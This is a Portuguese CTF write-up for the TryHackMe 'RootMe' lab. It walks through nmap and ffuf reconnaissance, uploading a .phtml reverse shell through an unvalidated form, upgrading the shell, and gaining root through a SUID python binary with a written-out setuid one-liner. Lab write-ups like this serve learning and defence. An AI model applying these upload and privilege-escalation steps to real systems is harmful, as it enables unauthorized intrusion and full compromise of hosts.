# ROOTME WRITEUP - TRYHACKME

este é um repositório rápido, explicando como conseguir ter acesso e rootar a máquina [rootme](https://tryhackme.com/room/rrootme) do tryhackme.



### OUTPUT DO NMAP 
```
nmap -sV -T5 -vvv -p- 10.10.128.17
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4a:b9:16:08:84:c2:54:48:ba:5c:fd:3f:22:5f:22:14 (RSA)
|   256 a9:a6:86:e8:ec:96:c3:f0:03:cd:16:d5:49:73:d0:82 (ECDSA)
|_  256 22:f6:b5:a6:54:d9:78:7c:26:03:5a:95:f3:f9:df:cd (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: HackIT - Home
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### BRUTE FORCE DE DIRETÓRIOS UTILIZANDO O FFUF

```
ffuf -c -u http://10.10.128.17/FUZZ -w /usr/share/wordlists/common.txt
uploads                 [Status: 301, Size: 314, Words: 20, Lines: 10]
js                      [Status: 301, Size: 309, Words: 20, Lines: 10]
panel                   [Status: 301, Size: 312, Words: 20, Lines: 10]
css                     [Status: 301, Size: 310, Words: 20, Lines: 10]
server-status           [Status: 403, Size: 277, Words: 20, Lines: 10]
                        [Status: 200, Size: 616, Words: 115, Lines: 26]
                        [Status: 200, Size: 616, Words: 115, Lines: 26]
:: Progress: [62275/62275] :: Job [1/1] :: 238 req/sec :: Duration: [0:04:21] :: Errors: 3 ::
```
encontrei dois diretórios interessante de analizar, que era o **panel** e **uploads**.

existia uma vulnerabilidade de upload de arquivo.
entrando no diretório podemos obter uma lista de arquivos upados, mas por enquanto o diretório ainda estava vazio.

entrando no diretório /panel encontramos um form de upload, no qual poderiamos upar um arquivo para obter uma reverse shell. 
obtive uma shell no site [reverse shells](https://www.hackingdream.net/2020/02/reverse-shell-cheat-sheet-for-penetration-testing-oscp.html)

Parece que o servidor não validava o tipo de arquivo que está sendo carregado, pelo menos .phtml ele não validava, portanto, podemos carregar nosso arquivo malicioso para obter uma reverse shell

Recebi um aviso dizendo que a shell foi upada. Entrei no diretório /uploads e lá estava meu arquivo malicioso, apenas executei e recebi a shell no meu netcat que estava rodando com a porta 1337 em modo de escuta.

### OBTENDO UMA SHELL MELHOR

Utilizando o modulo do python 'pty', usei alguns comandos para dar um upgrade na minha shell 

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm-256color
CTRL+Z
stty -echo raw
fg
stty rows 41 columns 166
```

Obtive a primeira flag que estava no diretório /home/$USER/user.txt

### BUSCANDO ARQUIVOS BINÁRIOS COM PERMISSÃO SUID

```
www-data@rootme:/home$ find / -perm /4000 2>/dev/                                                                           
/usr/lib/dbus-1.0/dbus-daemon-launch-helpe
/usr/lib/snapd/snap-confine
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
...
/usr/bin/python
...
/usr/bin/chfn
/usr/bin/gpasswd

www-data@rootme:/home$ ls -lat /usr/bin/python 
-rwsr-sr-x 1 root root 3665768 Aug  4 17:47 /usr/bin/python
```

Podemos ver o python com essas permissões. 

### PRIVESC NA MÁQUINA

Já que tinhamos o python executando com permissões elevadas, logo busquei uma maneira de elevar meus privilegios para root.
O [GTFOBin](https://gtfobins.github.io/) tem vários métodos de escalação de privações que podemos usar.

```
www-data@rootme:/$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@rootme:/$ /usr/bin/python -c 'import os; os.setuid(0); os.system("/bin/sh")'
# id
uid=0(root) gid=33(www-data) groups=33(www-data)

```

e assim conseguimos root e a flag root no diretório /root/root.txt
